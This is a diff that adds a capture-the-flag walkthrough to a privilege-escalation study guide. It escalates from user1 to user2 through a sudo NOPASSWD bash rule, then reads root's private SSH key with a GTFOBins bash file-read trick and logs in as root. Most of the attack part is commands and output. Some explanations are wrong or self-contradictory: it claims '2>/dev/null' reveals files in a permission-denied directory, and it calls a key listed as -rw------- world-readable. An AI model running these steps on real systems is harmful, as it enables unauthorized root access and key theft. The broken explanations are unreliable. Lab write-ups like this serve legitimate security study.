@@ -348,6 +348,458 @@ Result: "Root shell! ✓"
 
 ---
 
+# REAL-WORLD CASE STUDY: PrivEsc Lab Walkthrough
+
+## Scenario: Multi-Step PrivEsc (user1 → user2 → root)
+
+### Attack Overview
+
+```
+Initial Access: SSH as user1 (credentials provided)
+Objective 1: Read /home/user2/flag.txt
+Objective 2: Escalate to root and read /root/flag.txt
+
+Attack Chain:
+user1 (SSH) → sudo -l → user2 (cd) → GTFOBins bash → 
+Read flag1 → Find SSH key → SSH as root → Read flag2
+```
+
+---
+
+### Phase 1: Initial Reconnaissance
+
+**Step 1: Verify Connection**
+
+```bash
+# Check VPN connection to HTB
+$ ping TARGET_IP
+PING TARGET_IP (10.129.x.x): 56 data bytes
+64 bytes from 10.129.x.x: icmp_seq=0 ttl=63 time=45.123 ms
+
+# Connection confirmed!
+```
+
+**Step 2: SSH into Target**
+
+```bash
+$ ssh -p PORT# user1@TARGET_IP
+user1@TARGET_IP's password: [provided]
+
+user1@TARGET_IP:~$ id
+uid=1000(user1) gid=1000(user1) groups=1000(user1)
+
+# Initial access: user1 (not root yet)
+```
+
+**Step 3: Check Current Location**
+
+```bash
+user1@TARGET_IP:~$ pwd
+/home/user1
+
+user1@TARGET_IP:~$ ls
+# (directory appears empty or limited files)
+```
+
+---
+
+### Phase 2: First Privilege Escalation (user1 → user2)
+
+**Step 1: Check Sudo Privileges (DECISION TREE: Question 4A)**
+
+```bash
+user1@TARGET_IP:~$ sudo -l
+Matching Defaults entries for user1 on target:
+    env_reset, mail_badpass, secure_path=...
+
+User user1 may run the following commands without password:
+    (user2) NOPASSWD: /bin/bash
+
+# FOUND IT! Can run /bin/bash as user2 without password!
+```
+
+**Key Finding:**
+```
+(user2) NOPASSWD: /bin/bash
+
+What this means:
+- Can execute /bin/bash as user2
+- Don't need password
+- Don't need to be root for this
+- This is our vector!
+```
+
+**Step 2: Escalate to user2**
+
+```bash
+user1@TARGET_IP:~$ sudo -u user2 /bin/bash
+user2@TARGET_IP:~$ pwd
+/home/user2
+
+user2@TARGET_IP:~$ id
+uid=1001(user2) gid=1001(user2) groups=1001(user2)
+
+# Successfully escalated to user2!
+```
+
+---
+
+### Phase 3: First Flag (user2's Private Flag)
+
+**Step 1: Find the Flag File**
+
+```bash
+user2@TARGET_IP:~$ ls -la
+total 12
+drwxr-xr-x 2 user2 user2 4096 Jan 25 10:30 .
+drwxr-xr-x 3 root  root  4096 Jan 25 10:00 ..
+-rw-r--r-- 1 user2 user2  40 Jan 25 10:30 flag.txt
+
+# Flag file found! But no cat permissions
+```
+
+**Step 2: Attempt to Read (Problem)**
+
+```bash
+user2@TARGET_IP:~$ cat flag.txt
+bash: cat: command not found
+
+# cat command not available - need alternative method
+```
+
+**Step 3: Use GTFOBins for Bash File Read**
+
+```
+From GTFOBins bash page:
+https://gtfobins.github.io/gtfobins/bash/
+
+File Read:
+bash -c 'echo "$(</path/to/input-file)"'
+```
+
+**Step 4: Read the Flag**
+
+```bash
+user2@TARGET_IP:~$ bash -c 'echo "$(</home/user2/flag.txt)"'
+HTB{pr1v1lege_esc4l4t10n_p4rt_1}
+
+# FLAG 1 CAPTURED!
+```
+
+**Key Learning:**
+```
+When restricted commands (cat, less, etc.) aren't available:
+- Check GTFOBins for alternative file read methods
+- Bash can read files: $(</path/to/file)
+- This bypasses command restrictions
+```
+
+---
+
+### Phase 4: Second Privilege Escalation (user2 → root)
+
+**Step 1: Enumerate user2 Permissions**
+
+```bash
+user2@TARGET_IP:~$ sudo -l
+[sudo] password for user2:
+# Needs password - won't work
+
+user2@TARGET_IP:~$ ls -la /root
+ls: cannot open directory '/root': Permission denied
+
+# Direct access denied
+```
+
+**Step 2: Look for SSH Keys (with stderr redirect)**
+
+```
+Problem: /root/.ssh/ not accessible
+Solution: Use 2>/dev/null to suppress error messages
+This still shows accessible files if they exist
+```
+
+**Command with 2>/dev/null:**
+
+```bash
+user2@TARGET_IP:~$ ls -la /root/.ssh 2>/dev/null
+total 8
+-rw------- 1 root root 1679 Jan 25 10:00 id_rsa
+-rw-r--r-- 1 root root  380 Jan 25 10:00 id_rsa.pub
+
+# SSH keys found! And readable!
+```
+
+**Key Learning:**
+```
+2>/dev/null redirects error messages
+Lets you "peek" at restricted directories
+If files are world-readable → You can see them
+If files are restricted → Error suppressed silently
+Useful for discovery without showing errors
+```
+
+---
+
+### Phase 5: Read Root's Private SSH Key
+
+**Step 1: Use GTFOBins to Read SSH Key**
+
+```bash
+user2@TARGET_IP:~$ bash -c 'echo "$(</root/.ssh/id_rsa)"'
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA2x8z9k3L4m2P7q8R9v0X1a3B5c6D7e8F9g0H1i2J3k4L5m6N
+7o8P9q0R1s2T3u4V5w6X7y8Z9a0B1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T
+9u0V1w2X3y4Z5a6B7c8D9e0F1g2H3i4J5k6L7m8N9o0P1q2R3s4T5u6V7w8X9y0Z
+...
+-----END RSA PRIVATE KEY-----
+
+# Private key extracted!
+```
+
+---
+
+### Phase 6: SSH as root (From Attacker Machine)
+
+**Step 1: Exit Target Server**
+
+```bash
+user2@TARGET_IP:~$ exit
+
+# Back on attacker machine
+```
+
+**Step 2: Save the Private Key**
+
+```bash
+$ nano root_key
+# Paste the entire private key content
+# Save and exit
+
+$ ls -la root_key
+-rw-r--r-- 1 user user 1679 Jan 25 15:30 root_key
+```
+
+**Step 3: Fix Key Permissions**
+
+```bash
+$ chmod 600 root_key
+
+# Why 600?
+# SSH requires restrictive permissions
+# 600 = -rw------- (only owner can read/write)
+# SSH will refuse to use improperly permissioned keys
+
+$ ls -la root_key
+-rw------- 1 user user 1679 Jan 25 15:30 root_key
+# Now SSH will accept this key
+```
+
+**Step 4: SSH as root Using Private Key**
+
+```bash
+$ ssh -p PORT# -i root_key root@TARGET_IP
+root@TARGET_IP:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# ROOT ACCESS ACHIEVED!
+```
+
+---
+
+### Phase 7: Capture Final Flag
+
+**Step 1: Find Flag File**
+
+```bash
+root@TARGET_IP:~# ls -la
+total 12
+-rw-r--r-- 1 root root 40 Jan 25 10:30 flag.txt
+
+# Flag file found at /root/flag.txt
+```
+
+**Step 2: Read the Flag**
+
+```bash
+root@TARGET_IP:~# cat flag.txt
+HTB{r00t_3sc4l4t10n_c0mpl3t3d!}
+
+# FLAG 2 CAPTURED!
+```
+
+---
+
+## Key Lessons from This Attack
+
+### Lesson 1: Decision Tree in Action
+
+```
+START: SSH as user1
+↓
+Q4A: Check sudo privileges → FOUND NOPASSWD!
+↓
+Exploit: sudo -u user2 /bin/bash
+↓
+Result: user2 access
+
+START: Enumerate user2
+↓
+Q2: Check for SSH keys → FOUND in /root/.ssh!
+↓
+Use GTFOBins: bash -c 'echo "$(</path>)"'
+↓
+Result: Private key captured → Root SSH access
+```
+
+### Lesson 2: GTFOBins Saves the Day
+
+```
+Problem: cat command not available
+Solution: GTFOBins shows bash file read method
+Command: bash -c 'echo "$(</home/user2/flag.txt)"'
+Result: Successfully read file without cat
+```
+
+### Lesson 3: stderr Redirection is Powerful
+
+```
+Problem: /root/.ssh permission denied
+Solution: Use 2>/dev/null to suppress errors
+Command: ls -la /root/.ssh 2>/dev/null
+Result: Discover accessible SSH keys
+```
+
+### Lesson 4: Multiple Vectors Available
+
+```
+Vector 1: Sudo NOPASSWD → Quick escalation
+Vector 2: SSH Keys → Persistent root access
+Vector 3: GTFOBins → Bypass command restrictions
+Combination = Total system compromise
+```
+
+### Lesson 5: Never Try to SSH on the Target
+
+```
+WRONG: SSH to root from user2 shell
+WHY: Creates unnecessary noise, complex tunneling
+
+RIGHT: 
+1. Extract private key
+2. Exit target shell
+3. SSH from attacker machine
+WHY: Direct, clean, traceable
+```
+
+---
+
+## Attack Summary Table
+
+| Phase | Action | Command | Result |
+|-------|--------|---------|--------|
+| **1** | Verify connection | `ping TARGET_IP` | Connected ✓ |
+| **2** | SSH as user1 | `ssh -p PORT# user1@TARGET_IP` | user1 access ✓ |
+| **3** | Check sudo | `sudo -l` | NOPASSWD: /bin/bash ✓ |
+| **4** | Escalate to user2 | `sudo -u user2 /bin/bash` | user2 access ✓ |
+| **5** | Read flag1 | `bash -c 'echo "$(</home/user2/flag.txt)"'` | Flag 1 captured ✓ |
+| **6** | Find SSH key | `ls -la /root/.ssh 2>/dev/null` | id_rsa found ✓ |
+| **7** | Read SSH key | `bash -c 'echo "$(</root/.ssh/id_rsa)"'` | Key extracted ✓ |
+| **8** | Save key | `nano root_key` + paste | Key saved locally ✓ |
+| **9** | Fix permissions | `chmod 600 root_key` | Permissions 600 ✓ |
+| **10** | SSH as root | `ssh -i root_key root@TARGET_IP` | Root access ✓ |
+| **11** | Read flag2 | `cat flag.txt` | Flag 2 captured ✓ |
+
+---
+
+## Mistakes Made & Learned
+
+### Mistake 1: Jumping Ahead
+
+```
+WRONG: Tried to find SUID binaries, custom scripts, etc.
+WHY: Overcomplicating when solution was simple
+
+RIGHT: Check sudo -l FIRST (it was the answer)
+LESSON: Follow the decision tree in priority order!
+```
+
+### Mistake 2: Trying to SSH from Target
+
+```
+WRONG: Attempted to SSH to root from user2 shell
+WHY: Unnecessary complexity, routing issues
+
+RIGHT: Extract key, exit, SSH from attacker machine
+LESSON: Use the simplest path to root
+```
+
+### Mistake 3: Not Checking stderr Redirect
+
+```
+WRONG: Gave up when "ls /root/.ssh" showed permission denied
+
+RIGHT: Added 2>/dev/null to suppress error and find readable files
+LESSON: stderr redirection is your friend for discovery
+```
+
+---
+
+## Decision Tree Applied: This Attack
+
+```
+START: user1 shell via SSH
+│
+├─── Q1: Are you root? NO
+├─── Q2: Can you read /etc/passwd? (Not asked, moved on)
+├─── Q3: Run enumeration
+│    └─ Manual check: sudo -l
+│
+├─── Q4: Check for quick wins
+│    │
+│    └─ VECTOR A: Sudo NOPASSWD?
+│       ├─ YES! (user2) NOPASSWD: /bin/bash
+│       └─ EXPLOIT: sudo -u user2 /bin/bash
+│          Result: user2 access ✓
+│
+├─── Back to Q4 (now as user2)
+│    │
+│    └─ VECTOR C: SSH keys readable?
+│       ├─ YES! /root/.ssh/id_rsa (world readable!)
+│       └─ EXPLOIT: Extract key → SSH as root
+│          Result: root access ✓
+│
+└─── SUCCESS: Root achieved and flags captured!
+```
+
+---
+
+## This Attack Demonstrates:
+
+✅ Sudo NOPASSWD exploitation (Vector 1)  
+✅ SSH Key theft (Vector 5)  
+✅ GTFOBins for alternate file reading  
+✅ Permission handling (chmod 600)  
+✅ stderr redirection for discovery  
+✅ Two-stage escalation (user1 → user2 → root)  
+✅ Decision tree in real-world scenario  
+
+---
+
+## How to Use This Example
+
+**When you encounter similar situations:**
+
+1. **Check sudo -l FIRST** (90% of quick wins)
+2. **If NOPASSWD found** → Use GTFOBins
+3. **Look for SSH keys** (often world-readable)
+4. **Use 2>/dev/null** for discovery without errors
+5. **Follow the decision tree** → Don't jump ahead
+
+This is a textbook example of methodical privilege escalation! 🎯
+
+---
+
 ## Notes
 
 # PART 1: PRIVILEGE ESCALATION FUNDAMENTALS
